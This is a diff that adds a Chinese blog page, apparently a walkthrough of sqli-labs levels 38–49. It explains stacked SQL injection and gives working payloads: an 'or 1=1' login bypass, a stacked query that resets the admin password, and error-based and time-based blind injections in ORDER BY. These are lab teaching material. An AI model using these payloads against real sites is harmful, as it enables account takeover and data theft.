+<h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。<br>虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
+<h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>本关无闭合</p>
+<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>闭合为’)</p>
+<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>先用万能密码试用户名和密码，改变闭合<br><code>&#39;or 1=1#</code><br>发现在password存在注入点<br><img src="/img/59.png"><br>先用报错注入查出库名和表名，用户名等<br>于是我们返回登入页面，查看源码可知，存在堆叠注入,password栏输入<br><code>&#39;;update security.users set password=&#39;111112&#39; where username=&#39;admin&#39;#</code><br>用户名输入admin，登录失败，但是密码已被修改，再次登录，使用新密码即可成功登录</p>
+<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>与42相比只是闭合区别’)</p>
+<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>‘闭合，使用布尔盲注猜库表字段，再修改admin的密码</p>
+<h2 id="Less-46-47"><a href="#Less-46-47" class="headerlink" title="Less-46-47"></a>Less-46-47</h2><p>输入?sort&#x3D;1<br><img src="/img/60.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>这是一个排序语句<br>我们试一试使用联合查询<br><code>?sort=1 union select 1,2,3 --+</code><br><img src="/img/62.png"><br>order by 后面不可以接联合查询，我们试一试爆错注入<br><code>?sort=1 and updatexml(1,concat(0x5e,database()),1) --+</code><br><img src="/img/61.png"><br>ok<br>Less-47就是一个闭合的改变</p>
+<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>试了一下报错和布尔盲注都不行，使用时间盲注<br><code>?sort=1 and if(length(database())=8,sleep(5),1)</code><br>页面延时<br><img src="/img/63.png"><br>其他语句<br><code>?sort=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1)</code><br><code>?sort=1 and if(ascii(substr(select table_name from information_schema.tables where table_schema=&#39;security&#39;))=120,sleep(5),1)</code></p>
+<h2 id="Less-49-是闭合改变"><a href="#Less-49-是闭合改变" class="headerlink" title="Less-49 是闭合改变"></a>Less-49 是闭合改变</h2>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sqlilab/" rel="tag"># sqlilab</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/sqli-lab-Less-18-22.html" rel="next" title="sqli-lab-Less-18-22">
+                <i class="fa fa-chevron-left"></i> sqli-lab-Less-18-22
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/xss%E6%BC%8F%E6%B4%9E.html" rel="prev" title="xss漏洞">
+                xss漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+
+          
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-23"><span class="nav-number">1.</span> <span class="nav-text">Less-23</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-24"><span class="nav-number">2.</span> <span class="nav-text">Less-24</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.</span> <span class="nav-text">二次注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%8F%92%E5%85%A5%E6%81%B6%E6%84%8F%E6%95%B0%E6%8D%AE"><span class="nav-number">2.1.1.</span> <span class="nav-text">第一步：插入恶意数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%BC%95%E7%94%A8%E6%81%B6%E6%84%8F%E6%95%B0%E6%8D%AE"><span class="nav-number">2.1.2.</span> <span class="nav-text">第二步：引用恶意数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql-real-escape-string-%E2%80%94-%E8%BD%AC%E4%B9%89-SQL-%E8%AF%AD%E5%8F%A5%E4%B8%AD%E4%BD%BF%E7%94%A8%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="nav-number">2.2.</span> <span class="nav-text">mysql_real_escape_string — 转义 SQL 语句中使用的字符串中的特殊字符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-25"><span class="nav-number">3.</span> <span class="nav-text">Less-25</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-26"><span class="nav-number">4.</span> <span class="nav-text">Less-26</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D"><span class="nav-number">4.1.</span> <span class="nav-text">爆表名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E5%92%8C%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-number">5.</span> <span class="nav-text">黑名单和白名单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-27"><span class="nav-number">6.</span> <span class="nav-text">Less-27</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E5%BA%93%E5%90%8D"><span class="nav-number">6.1.</span> <span class="nav-text">爆库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D-1"><span class="nav-number">6.2.</span> <span class="nav-text">爆表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5"><span class="nav-number">6.3.</span> <span class="nav-text">爆字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE"><span class="nav-number">6.4.</span> <span class="nav-text">爆数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-28"><span class="nav-number">7.</span> <span class="nav-text">Less-28</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="nav-number">7.1.</span> <span class="nav-text">猜库名长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ASCII%E7%A0%81%E7%8C%9C%E8%A7%A3%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="nav-number">7.2.</span> <span class="nav-text">利用ASCII码猜解当前数据库名称</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E8%A1%A8%E5%90%8D"><span class="nav-number">7.3.</span> <span class="nav-text">猜表名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-32"><span class="nav-number">8.</span> <span class="nav-text">Less-32</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%AE%BD%E5%AD%97%E8%8A%82"><span class="nav-number">8.1.</span> <span class="nav-text">什么是宽字节</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-number">8.2.</span> <span class="nav-text">宽字节注入原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-33"><span class="nav-number">9.</span> <span class="nav-text">Less-33</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-34"><span class="nav-number">10.</span> <span class="nav-text">Less-34</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-35"><span class="nav-number">11.</span> <span class="nav-text">Less-35</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-36"><span class="nav-number">12.</span> <span class="nav-text">Less-36</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-37"><span class="nav-number">13.</span> <span class="nav-text">Less-37</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-38"><span class="nav-number">14.</span> <span class="nav-text">Less-38</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-number">14.1.</span> <span class="nav-text">堆叠注入原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="nav-number">14.2.</span> <span class="nav-text">堆叠注入的局限性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-39"><span class="nav-number">15.</span> <span class="nav-text">Less-39</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-40"><span class="nav-number">16.</span> <span class="nav-text">Less-40</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-41"><span class="nav-number">17.</span> <span class="nav-text">Less-41</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-43"><span class="nav-number">18.</span> <span class="nav-text">Less-43</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-44"><span class="nav-number">19.</span> <span class="nav-text">Less-44</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-46-47"><span class="nav-number">20.</span> <span class="nav-text">Less-46-47</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-48"><span class="nav-number">21.</span> <span class="nav-text">Less-48</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-49-%E6%98%AF%E9%97%AD%E5%90%88%E6%94%B9%E5%8F%98"><span class="nav-number">22.</span> <span class="nav-text">Less-49 是闭合改变</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzklov</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #4D4D4C;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #F7F7F7;
+      background-image: linear-gradient(#F7F7F7, #F7F7F7);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('Copy').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('Copied')
+          else $(this).text('Copy failed')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('Copy')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+ 
+</body>
+</html>
